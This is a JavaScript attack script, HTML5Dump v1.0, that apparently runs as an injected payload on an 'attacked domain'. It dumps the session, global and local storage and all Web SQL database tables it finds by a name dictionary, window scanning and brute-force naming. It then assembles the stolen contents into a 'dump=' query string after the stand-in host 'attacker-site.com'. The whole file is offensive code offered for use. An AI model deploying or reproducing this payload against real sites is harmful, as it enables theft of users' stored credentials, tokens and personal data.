/*/
* HTML5Dump v1.0 - August 2011
* 
* This JavaScript code will dump in an automated fashion ALL the content of the
* HTML 5 Client-side Storage technology of the attacked domain.
* 
* Download the last version at: https://code.google.com/p/html5dump
* 
* Written by Sro [http://sro.co.il]
* 
* Based on HTML5CSdump v0.6 - August 2008 (http://trivero.secdiscover.com/html5csdump.js)
* That coded by Alberto 'ameft' Trivero - a.trivero(*)secdiscover.com
/*/

var dump_ss = "";
var dump_gs = "";
var dump_ls = "";
var dump_db = "";

function dumpSessoinStorage()
{
	var dump = "";
	for(i = 0; i < sessionStorage.length; i++) {
		dump += "window.sessionStorage." + sessionStorage.key(i) + " = " + sessionStorage.getItem(sessionStorage.key(i)) + "\n";
	}
	dump_ss = dump;
}

function dumpGlobalStorage()
{
	var dump = "";
	for(i = 0; i < globalStorage[location.hostname].length; i++) {
		dump += "window.globalStorage['" + location.hostname + "']." +
		globalStorage[location.hostname].key(i) + " = " + globalStorage[location.hostname].getItem(globalStorage[location.hostname].key(i)) + "\n";
	}
	dump_gs = dump;
}

function dumpLocalStorage()
{
	var dump = "";
	for(i = 0; i < localStorage.length; i++) {
		dump += "window.localStorage." + localStorage.key(i) + " = " + localStorage.getItem(localStorage.key(i)) + "\n";
	}
	dump_ls = dump;
}

function dumpSqlite()
{
	findDB();
	findDBobj();
	findDataBaseByBruteForce();
}

function dumpAll()
{
	if("sessionStorage" in window) {
		dumpSessoinStorage(); 
	}
	
	if("globalStorage" in window) {
		dumpGlobalStorage(); 
	}
	
	if("localStorage" in window) {
		dumpLocalStorage(); 
	}
	
	if("openDatabase" in window) {
		dumpSqlite();
		intervalId = setInterval("db_finish()", 100);
	} else {
		dump();
	}
}

function dump()
{
	request = "dump=";
	if(dump_ss) {
		request += escape(dump_ss + "\n"); }
	if(dump_gs) {
		request += escape(dump_gs + "\n"); }
	if(dump_ls) {
		request += escape(dump_ls + "\n"); }
	if(dump_db) {
		request += escape(dump_db + "\n"); }
	request += escape("Dumped by HTML5Dump v1.0");
	document.write("<html><body><pre>" + "attacker-site.com/?" + request + "\n\n" + unescape(request) + "</pre></body></html>");
}


/*** 4 help functions for dumping database ***/
var intervalId = 0;
var cur_temp = "";
var prev_temp = "";

function findDB()
{
	var DB_Dictionary = ['sql', 'SQL', 'DB', 'db', 'SQLITE', 'SQLite', 'sqlite', 'DB1', 'db1', 'DataBase', 'DATEBASE', 'sqli'];
	for(db in DB_Dictionary)
		checkDB(DB_Dictionary[db]);
}

function checkDB(name)
{
	HTML5Dump_DBobj = openDatabase(name, "1.0", "Web SQL Database Client-side SQL Injection Example",2000);
	HTML5Dump_DBobj.transaction(function (tx) {
		tx.executeSql("SELECT * FROM sqlite_master WHERE type='table'", [],	function(tx, result) {
			if(result.rows.length > 1)
				DBdumpDatabase(HTML5Dump_DBobj, name);
		})
	})
}

function findDBobj()
{
	for(obj in window) {
		if(window[obj] == "[object Database]" && obj != "HTML5Dump_DBobj") {
			DBdumpDatabase(window[obj], obj);
		}
	}
}

function findDataBaseByBruteForce()
{
	var alphabeta = "abcdefghijklmnopqrstuvwxyz"
	var alphanumeric = "abcdefghijklmnopqrstuvwxyz0123456789"
	var capandlittle = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var maxlen = 2;
	var prefix = "";
	var endfix = "";
	// findDBbyBF(alphabeta, " ".repeat(maxlen), prefix, endfix, 0, 0);
}

function DBdumpDatabase(DBobj, DBname)
{
	DBobj.transaction(function (tx) {
		tx.executeSql("SELECT * FROM sqlite_master WHERE type='table'", [],
		function(tx, result) {
			for(i = 0; i < result.rows.length; i++) {
				var row = result.rows.item(i);
				if(row['name'] != "__WebKitDatabaseInfoTable__") { // inaccessible table created by WebKit
					DBdumpTable(DBobj, DBname, row['name'])
				}
			}
		})
	});
}

function DBdumpTable(DBobj, DBname, table)
{
	//db.transaction(function (tx) {
		//tx.executeSql("SELECT sql FROM sqlite_master WHERE name=?", [table], function(tx, result) { // draw column names by the create query
		//});
	//});
	DBobj.transaction(function (ty) {
		ty.executeSql("SELECT * FROM " + table, [], function(ty, result2) { // you can't use the ? placeholder to specify the table name
			columns = "";
			for(k in result2.rows.item(0)) {
				columns += "[ " + k + " ]";
				}
			content = "";
			for(i = 0; i < result2.rows.length; i++) {
				for(k in result2.rows.item(i)) {
					content += "[ " + result2.rows.item(i)[k] + " ]";
				}
				content += "\n";
			}
			draw = "Database: " + DBname + "\n";
			draw += "Table: " + table + "\n";
			draw += "Columns: " + columns + "\n";
			draw += content + "\n\n";
			cur_temp += draw;
		});
	});
}

function db_finish()
{
	if(cur_temp != prev_temp) {
		prev_temp = cur_temp;
	} else {
		dump_db = cur_temp;
		clearInterval(intervalId);
		dump();
	}	
}
/*** End of 4 help functions for dumping sqlite databases ***/

/*** 3 help functions for dumping database by Brute Force ***/

function findDBbyBF(chars, str, prefix, endfix, cur_char, cur_change)
{
	if(cur_change == str.length || cur_char == chars.length)
		return true;
	
	str = self.repChar(str, cur_change, chars[cur_char]);
	//if(cur_change == str.length - 1)
		checkDB(prefix + str + endfix);
	
	findDBbyBF(chars, str, prefix, endfix, 0, cur_change + 1);
	findDBbyBF(chars, str, prefix, endfix, cur_char + 1, cur_change);
}

function repChar(str, index, chr)
{
	if(index == str.length - 1)
		return str.substr(0, index) + chr;
	else
		return str.substr(0, index) + chr + str.substr(index + 1);
}
	
String.prototype.repeat = function(num)
{
	return new Array(isNaN(num)? 1 : ++num).join(this);
}

/*** End of 3 help functions for dumping by Brute Force ***/

// Start dump !
dumpAll();
